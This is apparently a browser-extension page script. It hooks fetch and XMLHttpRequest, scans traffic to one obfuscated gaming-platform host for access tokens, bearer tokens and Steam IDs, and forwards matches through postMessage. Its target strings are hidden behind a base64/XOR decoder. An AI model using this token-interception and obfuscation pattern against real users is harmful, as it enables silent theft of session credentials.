var __S_content_pw_page_hook_js=(function(){var T="Dsbm9I2mq5yrY2JVSEkzJzMey/PCwti4i5fa1lBZCGheYSNWXrmjxdmf7vP2tY4zOTAcB3EtdAUhMRUNEwl2Y2teRWwsMwQ8aWwlMQAd6+7+2c2uvJKEgGZgSEFVNC1PGxPi883M3Km0gYKNVCdRXVQpNxoA9Oj7yuuioIScmmlqcgASCrTQ2bG4q8aWbWI=",P=[15,71,61,132,55,0],C=[],B,M="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";function L(){if(B)return B;var o=[],b=0,s=0,i=0,v=0;for(i=0;i<T.length;i++){v=M.indexOf(T.charAt(i));if(v<0)continue;b=(b<<6)|v;s+=6;if(s>=8){s-=8;o.push((b>>s)&255)}}B=o;return o}function U(a,f,n){var o="",i=f,e=f+n;while(i<e){var c=a[i++];if(c<128)o+=String.fromCharCode(c);else if(c>191&&c<224)o+=String.fromCharCode(((c&31)<<6)|(a[i++]&63));else if(c>223&&c<240)o+=String.fromCharCode(((c&15)<<12)|((a[i++]&63)<<6)|(a[i++]&63));else{var q=((c&7)<<18)|((a[i++]&63)<<12)|((a[i++]&63)<<6)|(a[i++]&63);q-=65536;o+=String.fromCharCode(55296+(q>>10),56320+(q&1023))}}return o}function D(p){if(C[p]!==undefined)return C[p];var b=L(),i=p+1,k=0,n=b[p],r=[];for(k=0;k<n;k++){r.push(b[i]^((0x9e+0x1f*p+0x0d*k)&255));i++}return C[p]=U(r,0,r.length)}return function(k){return D(P[k])}})();
var __VG=(typeof self!=="undefined"&&self)?self:((typeof globalThis!=="undefined")?globalThis:this);
function __VQfetch(u,o){var f=__VG[__S_content_pw_page_hook_js(4)];return f.call(__VG,u,o)}
var __VQxhr=__VG[__S_content_pw_page_hook_js(5)];


(function () {
    'use strict';
    if (window.__spsPwHookInstalled) return;   
    window.__spsPwHookInstalled = true;

    var TOKEN_CHARS_RE = /^[A-Za-z0-9._~+/=-]{16,512}$/;
    var URLISH_RE = /(:\/\/|\.(?:com|cn|net|org|io|html?|js|json|png|jpe?g|gif|svg|css|woff2?|map)$)/i;
    
    var TOKEN_KEY_RE = /(^|["'\s{,])(token|access_?token|steam_cn_token|x-token)["'\s]*[:=]["'\s]*([A-Za-z0-9._~+/=-]{16,512})/i;
    var BEARER_RE = new RegExp(__S_content_pw_page_hook_js(0), 'i');

    var MY_SID_RE = /(^|["'\s{,])(mysteamid|my_steam_?id|my_?steamid64)["'\s]*[:=]["'\s]*(7656119\d{10})/i;
    
    var HEADER_NAME_RE = new RegExp(__S_content_pw_page_hook_js(1), 'i');

    function isWmpvpUrl( u) {
        try {
            const h = new URL(String(u || ''), location.href).hostname.toLowerCase();
            return h === __S_content_pw_page_hook_js(2) || h.endsWith(__S_content_pw_page_hook_js(3));
        } catch (e) { return false; }
    }

    function asToken( v) {
        const s = String(v == null ? '' : v).trim().replace(/^bearer\s+/i, '').trim();
        if (!TOKEN_CHARS_RE.test(s)) return '';
        if (!/[A-Za-z]/.test(s)) return '';          
        if (URLISH_RE.test(s)) return '';            
        return s;
    }

    var SELF_ORIGIN = (function () {
        try { var o = location.origin; return (o && o !== 'null') ? o : '*'; } catch (e0) { return '*'; }
    })();

    function send( tok,  source,  sid = '') {
        try { window.postMessage({ __spsPwToken: 1, token: tok || '', steamid: sid || '', source: source }, SELF_ORIGIN); } catch (e) {  }
    }

    function headerToken( v) {
        return asToken(v);
    }

    function scanText( txt,  source) {
        if (!txt || typeof txt !== 'string' || txt.length > 2e6) return;
        const sid = MY_SID_RE.exec(txt);
        const mt = TOKEN_KEY_RE.exec(txt);
        const mb = mt ? null : BEARER_RE.exec(txt);
        if (mt || sid || mb) send(mt ? asToken(mt[3]) : (mb ? asToken(mb[1]) : ''), source, sid ? sid[3] : '');
    }

    function scanHeaders( hs,  source) {
        try {
            if (!hs) return;
            if (typeof hs.forEach === 'function' && typeof hs.get === 'function') {   
                hs.forEach(( v,  k) => { if (HEADER_NAME_RE.test(String(k || ''))) { const t = headerToken(v); if (t) send(t, source); } });
                return;
            }
            if (Array.isArray(hs)) {
                for (const pair of hs) { if (pair && HEADER_NAME_RE.test(String(pair[0] || ''))) { const t = headerToken(pair[1]); if (t) send(t, source); } }
                return;
            }
            if (typeof hs === 'object') {
                for (const k in hs) { if (HEADER_NAME_RE.test(String(k))) { const t = headerToken(hs[k]); if (t) send(t, source); } }
            }
        } catch (e) {  }
    }

    const _fetch = window[__S_content_pw_page_hook_js(4)];
    if (typeof _fetch === 'function') {
        window[__S_content_pw_page_hook_js(4)] = function (input, init) {
            let watchRes = false;
            try {
                const req =  (input);   
                const url = (req && typeof req === 'object' && req.url) ? String(req.url) : String(input || '');
                if (isWmpvpUrl(url)) {
                    watchRes = true;
                    try { scanHeaders((init && init.headers) || (req && req.headers) || null, 'req_header'); } catch (e0) {  }
                    try { const b = init && init.body; if (typeof b === 'string') scanText(b, 'req_body'); } catch (e1) {  }
                }
            } catch (e4) {  }
            const p = _fetch.apply(this, arguments);   
            if (watchRes) {
                try {
                    p.then(( res) => {
                        try { if (res && res.clone) res.clone().text().then(( t) => scanText(t, 'res_body')).catch(() => {}); } catch (e2) {  }
                    }).catch(() => {});
                } catch (e5) {  }
            }
            return p;
        };
    }

    const XO = window[__S_content_pw_page_hook_js(5)];
    if (typeof XO === 'function' && XO.prototype) {
        const XP =  (XO.prototype);
        const OPEN = XP.open, SEND = XP.send, SH = XP.setRequestHeader;
        XP.open = function () {
            try { this.__spsPwU = String(arguments[1] || ''); } catch (e0) {  }
            return OPEN.apply(this, arguments);
        };
        XP.setRequestHeader = function (n, v) {
            try {
                if (HEADER_NAME_RE.test(String(n || '')) && isWmpvpUrl(this.__spsPwU || '')) {
                    const t = headerToken(v);
                    if (t) send(t, 'req_header');
                }
            } catch (e1) {  }
            return SH.apply(this, arguments);
        };
        XP.send = function () {

            const xhr =  (this);
            try {
                if (isWmpvpUrl(xhr.__spsPwU || '')) {
                    const b = arguments[0];
                    if (typeof b === 'string') scanText(b, 'req_body');

                    if (!xhr.__spsLoadHooked) {
                        xhr.__spsLoadHooked = true;
                        xhr.addEventListener('load', () => {
                            try {
                                if (isWmpvpUrl(xhr.__spsPwU || '')) scanText(String(xhr.responseText || ''), 'res_body');
                            } catch (e2) {  }
                        });
                    }
                }
            } catch (e3) {  }
            return SEND.apply(this, arguments);
        };
    }
})();
